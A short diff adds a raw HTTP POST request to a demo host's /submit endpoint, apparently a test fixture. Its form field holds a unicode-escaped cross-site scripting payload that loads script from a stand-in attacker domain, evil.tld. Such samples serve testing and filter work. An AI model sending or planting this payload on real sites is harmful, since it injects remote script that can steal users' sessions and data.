@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 63
+Connection: close
+
+input=\u003Cscript src=//evil.tld/x.js\u003E\u003C/script\u003E
